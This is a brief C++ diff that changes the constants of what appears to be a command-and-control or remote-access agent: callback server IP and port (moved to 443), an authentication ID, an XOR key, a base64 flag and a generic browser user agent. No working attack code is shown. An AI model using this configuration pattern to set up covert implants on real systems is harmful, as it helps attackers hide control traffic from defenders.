@@ -17,11 +17,11 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-const std::string SERVER_IP = "192.168.1.107";
-const int SERVER_PORT = 2222;
+const std::string SERVER_IP = "127.0.0.1";
+const int SERVER_PORT = 443;
 const std::string AUTH_ID = "df7214d2-02e2-4f9e-b297-872444044a37";
-const int XOR_KEY = 11;
-const bool STATUS_BASE64 = true;
+const int XOR_KEY = 205;
+const bool STATUS_BASE64 = false;
 
 const std::string DEFAULT_USER_AGENT = "Mozilla/5.0";
 std::string PREPEND_OUTPUT = "";
